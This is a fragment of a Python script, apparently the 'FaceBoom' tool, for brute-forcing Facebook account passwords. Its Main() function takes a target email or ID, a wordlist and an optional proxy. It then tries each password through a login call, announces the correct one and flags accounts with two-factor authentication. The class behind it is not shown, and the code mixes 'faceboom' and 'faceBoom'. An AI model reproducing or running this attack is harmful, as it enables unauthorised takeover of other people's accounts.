hahsjsjs
















def Main():
   parse.add_option("-t","--target",'-T','--TARGET',dest="target",type="string",
      help="Specify Target Email or ID")
   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wordlist",type="string",
      help="Specify Wordlist File ")
   parse.add_option("-s","--single","--S","--SINGLE",dest="single",type="string",
      help="Specify Single Password To Check it")
   parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                        help="Specify HTTP/S Proxy to be used")
   parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
                        help="Specify TARGET FACEBOOK PROFILE URL to get his ID")
   parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
   (options,args) = parse.parse_args()
   faceboom = FaceBoom()
   target = options.target
   wordlist = options.wordlist
   single_passwd = options.single
   proxy = options.proxy
   target_profile = options.url
   update = options.update
   opts = [target,wordlist,single_passwd, proxy, target_profile, update]
   if any(opt for opt in opts):
     if not faceboom.cnet():
       errMsg("Please Check Your Internet Connection")
       sys.exit(1)
   if update:
    faceboom.updateFaceBoom()
    sys.exit(1)
   elif target_profile:
        faceboom.get_profile_id(target_profile)
        sys.exit(1)
   elif wordlist or single_passwd:
        if wordlist:
            if not os.path.isfile(wordlist):
                errMsg("Please check Your Wordlist Path")
                sys.exit(1)
        if single_passwd:
            if len(single_passwd.strip()) < 6:
                errMsg("Invalid Password")
                print("[!] Password must be at least '6' characters long")
                sys.exit(1)
        if proxy:
             if proxy.count(".") != 3:
                    errMsg("Invalid IPv4 ["+rd+str(proxy)+yl+"]")
                    sys.exit(1)
             print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0]))
             final_proxy = proxy+":8080" if not ":" in proxy else proxy
             if faceBoom.check_proxy(final_proxy):
                faceBoom.useProxy = final_proxy
                faceBoom.br.set_proxies({'https':faceBoom.useProxy, 'http':faceBoom.useProxy})
                print(wi+"["+gr+"Connected"+wi+"]")
             else:
                errMsg("Connection Failed")
                errMsg("Unable to connect to Proxy["+rd+str(proxy)+yl+"]")
                sys.exit(1)
        faceboom.banner(target,wordlist,single_passwd)
        loop,passwords = (1,open(wordlist).readlines()) if not single_passwd else ("~",[single_passwd])
        for passwd in passwords:
                passwd = passwd.strip()
                if len(passwd) <6:continue
                write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
                retCode = faceboom.login(target, passwd)
                if retCode:
                    sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    if retCode == 2:print(wi+"["+yl+"!"+wi+"]"+yl+" Warning: This account use ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
                    break
                else:
                    sys.stdout.write(yl+" ==> Login"+rd+" Failed\n")
                    loop = loop + 1 if not single_passwd else "~"
        else:
                if single_passwd:
                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another password or Wordlist "+gr+":)"+wi)
                else:
                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+wi)
        sys.exit(1)
   else:
       print(parse.usage)
       sys.exit(1)
if __name__=='__main__':
    Main()
##############################################################
#####################                #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
